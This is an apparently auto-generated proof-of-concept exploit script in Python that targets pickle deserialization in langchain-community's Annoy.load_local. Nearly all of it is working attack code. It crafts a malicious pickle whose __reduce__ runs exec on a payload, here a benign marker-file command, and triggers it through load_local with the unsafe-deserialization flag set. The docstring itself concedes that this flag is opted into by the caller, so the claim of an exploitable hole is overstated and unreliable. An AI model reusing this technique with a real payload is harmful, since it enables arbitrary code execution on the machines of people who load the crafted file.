#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-017
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_13.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE via pickle deserialization.

Vulnerability: The load_local function in langchain_community/vectorstores/annoy.py
uses pickle.load on a file whose path is constructed from user-controlled folder_path.
Although there is a guard (allow_dangerous_deserialization) that must be set to True,
this guard is a developer-side flag that the caller controls. If the caller sets it to True,
an attacker who controls folder_path can supply a path to a malicious pickle file,
leading to arbitrary code execution.

This PoC demonstrates the vulnerability by:
1. Creating a malicious pickle file that executes a benign command (touch /tmp/poc_success.txt)
2. Hosting it in a directory accessible via a local path
3. Calling load_local with allow_dangerous_deserialization=True and folder_path pointing to
   the directory containing the malicious pickle file

Usage:
    python3 poc.py [--target-path /path/to/malicious/dir]
"""

import os
import sys
import pickle
import tempfile
import argparse
import subprocess
from pathlib import Path

# Benign payload - creates a marker file to prove code execution
BENIGN_PAYLOAD = """
import os
os.system('touch /tmp/poc_success.txt')
"""

def create_malicious_pickle(output_dir: str) -> str:
    """
    Create a malicious pickle file that executes a benign command.
    
    The pickle file will be named 'index.pkl' as expected by load_local.
    When unpickled, it will execute the payload defined above.
    
    Args:
        output_dir: Directory to write the malicious pickle file
        
    Returns:
        Path to the created pickle file
    """
    class MaliciousPickle:
        def __reduce__(self):
            # Return a tuple (callable, args) that will be called during unpickling
            return (exec, (BENIGN_PAYLOAD,))
    
    # Create the malicious pickle object
    malicious_obj = MaliciousPickle()
    
    # Write it to index.pkl in the output directory
    pickle_path = os.path.join(output_dir, "index.pkl")
    with open(pickle_path, "wb") as f:
        pickle.dump(malicious_obj, f)
    
    print(f"[+] Created malicious pickle file at: {pickle_path}")
    return pickle_path

def create_annoy_index_file(output_dir: str) -> str:
    """
    Create a minimal Annoy index file (index.annoy) that load_local expects.
    This is required because load_local also tries to load an Annoy index.
    
    Args:
        output_dir: Directory to write the Annoy index file
        
    Returns:
        Path to the created Annoy index file
    """
    # Create a minimal Annoy index file (just a placeholder)
    annoy_path = os.path.join(output_dir, "index.annoy")
    with open(annoy_path, "wb") as f:
        # Write minimal valid Annoy index header
        # This is just a placeholder - the actual exploit is in the pickle file
        f.write(b"\x00" * 100)
    
    print(f"[+] Created placeholder Annoy index at: {annoy_path}")
    return annoy_path

def exploit(target_path: str) -> None:
    """
    Execute the exploit by calling load_local with the malicious pickle file.
    
    Args:
        target_path: Path to directory containing malicious pickle file
    """
    # Import the vulnerable function
    # Note: This assumes langchain-community is installed in /tmp/langchain-community-only
    sys.path.insert(0, "/tmp/langchain-community-only")
    
    try:
        from langchain_community.vectorstores.annoy import Annoy
    except ImportError as e:
        print(f"[-] Failed to import Annoy: {e}")
        print("[*] Make sure langchain-community is installed at /tmp/langchain-community-only")
        sys.exit(1)
    
    # Create a mock embeddings object (required by load_local but not used in exploit)
    class MockEmbeddings:
        def embed_query(self, query):
            return [0.0] * 100  # Return dummy embedding
    
    embeddings = MockEmbeddings()
    
    print(f"[*] Attempting to load malicious pickle from: {target_path}")
    print("[*] Setting allow_dangerous_deserialization=True")
    
    try:
        # This is the vulnerable call - folder_path is attacker-controlled
        # and allow_dangerous_deserialization is set to True
        result = Annoy.load_local(
            folder_path=target_path,
            embeddings=embeddings,
            allow_dangerous_deserialization=True
        )
        print(f"[+] load_local completed successfully (unexpected)")
    except Exception as e:
        # The exploit may fail after code execution due to invalid Annoy index
        # But the payload should have executed before the error
        print(f"[*] load_local raised exception (expected): {e}")
    
    # Check if the payload executed
    if os.path.exists("/tmp/poc_success.txt"):
        print("[+] SUCCESS: Payload executed! /tmp/poc_success.txt was created.")
        print("[*] This proves arbitrary code execution is possible.")
    else:
        print("[-] Payload did not execute. Check the setup.")

def main():
    parser = argparse.ArgumentParser(
        description="PoC for langchain-community RCE via pickle deserialization"
    )
    parser.add_argument(
        "--target-path",
        help="Path to directory containing malicious pickle file (default: temp dir)",
        default=None
    )
    args = parser.parse_args()
    
    # Create a temporary directory for the malicious files
    if args.target_path:
        target_dir = args.target_path
        os.makedirs(target_dir, exist_ok=True)
    else:
        target_dir = tempfile.mkdtemp(prefix="langchain_poc_")
    
    print(f"[*] Using target directory: {target_dir}")
    
    # Create the malicious pickle file
    create_malicious_pickle(target_dir)
    
    # Create the required Annoy index file
    create_annoy_index_file(target_dir)
    
    # Execute the exploit
    exploit(target_dir)
    
    # Clean up the marker file
    if os.path.exists("/tmp/poc_success.txt"):
        os.remove("/tmp/poc_success.txt")
        print("[*] Cleaned up /tmp/poc_success.txt")

if __name__ == "__main__":
    main()
